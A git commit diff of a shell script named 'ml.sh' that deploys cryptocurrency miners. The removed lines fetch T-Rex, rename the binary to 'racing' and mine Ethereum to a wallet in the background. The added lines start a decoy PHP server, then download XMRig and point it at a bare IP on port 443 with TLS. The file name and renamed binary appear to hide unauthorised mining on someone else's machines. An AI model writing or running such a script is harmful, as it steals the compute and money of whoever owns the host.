494b0662e2c7b50ac08594f57e9e67f8f90db073
nothing123468 <108989568+nothing123468@users.noreply.github.com>
2022-07-11 14:25:23 +0000

    Update ml.sh

--- ml.sh
+++ ml.sh
@@ -1,18 +1,7 @@
 cd /home
-distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
 apt-get update
-wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
-tar xvzf t-rex-0.21.6-linux.tar.gz
-mv t-rex racing
-/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x70c2B35C88Df3703cB8c3bfaAfeE9f2E070bA98A -q -p x -w anohito &
 touch index.php
-x=1
-while [ $x -le 5 ]
-do
-  echo "Welcome $x times"
-  php -S 0.0.0.0:8080 &
-  sleep 5
-  killall php
-  echo "Kill $x times"
-  sleep 30
-done
+php -S 0.0.0.0:8080 &
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
+tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
+xmrig-6.16.2/xmrig -o 103.95.197.2:443 --randomx-no-rdmsr --tls true
